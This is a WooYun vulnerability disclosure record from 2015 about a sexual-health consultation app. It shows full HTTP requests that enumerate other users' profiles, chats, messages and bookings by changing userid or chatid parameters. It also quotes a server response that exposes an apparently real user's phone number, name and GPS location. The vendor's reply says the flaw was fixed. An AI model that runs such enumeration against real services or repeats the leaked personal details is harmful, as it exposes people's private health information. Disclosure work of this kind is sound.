{"id": 35553, "wybug_id": "wooyun-2015-0103678", "wybug_title": "两性私人医生设计不当大量用户隐私信息泄露", "wybug_corp": "ranknowcn.com", "wybug_author": "路人甲", "wybug_date": "2015-03-27 11:27", "wybug_open_date": "2015-05-11 13:26", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向公众公开  简要描述： 两性私人医生设计不当大量用户隐私信息泄露有些东西看后好羞涩~ 详细说明：  1、下载app，然后成功注册。（这里注册的只需要提供一个用户名和一个密码即可成功注册）2、里面有好几个板块，直接抓包看数据，首先是【个人中心】界面3、抓包数据如下\n\n看了整个post的请求，并没有很好的安全设置，那么修改userid即可遍历用户的信息了   漏洞证明：  1、遍历ID即可获取个人中心的数据\n\n数据中包含了用户名，电话（非必填项），地址等等~结合以下的操作，危害更大\nHTTP/1.1 200 OKServer: nginx/1.4.3Date: Wed, 25 Mar 2015 08:20:56 GMTContent-Type: text/html; charset=utf-8Connection: closeX-Powered-By: PHP/5.3.5Access-Control-Allow-Origin: *Content-Length: 379{\"result\":true,\"msg\":{\"id\":3886637,\"mobile\":\"18706616446\",\"username\":\"\\u738b\\u7acb\\u5fe0\",\"regdate\":1427173213,\"name\":\"\\u738b\\u7acb\\u5fe0\",\"gender\":0,\"age\":32,\"cityid\":25000,\"city2id\":371600,\"intro\":\"\",\"addrdetail\":\"118.136887,37.187186,,,\\u535a\\u5174\\u53bf,\\u6ee8\\u5dde\\u5e02,\\u5c71\\u4e1c\\u7701\",\"gendername\":\"\\u5973\",\"cityname\":\"\\u5c71\\u4e1c\",\"city2name\":\"\\u6ee8\\u5dde\\u5e02\"}}\n2、由于是在线咨询，某些用户的信息未必准确（未对手机进行验证）。接着看看其他几个地方的隐私泄露又是怎么样的。【我的咨询】这里不需要修改userid，直接修改chatid即可遍历了~\nPOST /api/m.php?action=chatinfo HTTP/1.1Content-Length: 192Content-Type: application/x-www-form-urlencodedHost: medapp.ranknowcn.comConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)cookie=&os=android&source=huawei&token=55111b0534eb4&imei=865585021358696&userid=3888173&appid=4&chatid=3251116&app_version_name=1.2.0206.0&chatsource=mylist&deviceid=55111b0534eb4&version=2.2\n看看效果，根据返回长度，选择一条长度最大的看看内容\n\n解密一下看看，【良心打码，我不是故意的】\n\n【我的消息】不一一证明了~\nGET /html5/myxiaoxi.php?deviceid=55111b0534eb4&userid=【修改此处即可】&appid=4 HTTP/1.1Host: medapp.ranknowcn.comProxy-Connection: keep-alivex-wap-profile: http://wap1.huawei.com/uaprof/HUAWEI_PE-UL00_UAProfile.xmlAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; PE-UL00 Build/HuaweiPE-UL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36Accept-Encoding: gzip,deflateAccept-Language: zh-CN,en-US;q=0.8X-Requested-With: com.medapp.all\n【我的预约】同上\nPOST /api/m.php?action=bookinghistory HTTP/1.1Content-Length: 159Content-Type: application/x-www-form-urlencodedHost: medapp.ranknowcn.comConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)cookie=&os=android&source=huawei&token=55111b0534eb4&imei=865585021358696&userid=【修改此处即可】&appid=4&app_version_name=1.2.0206.0&deviceid=55111b0534eb4&version=2.2\n   修复方案：  你们比我更专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-03-27 13:25 厂商回复： 多谢，已经针对问题进行了修整。请再接再厉 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}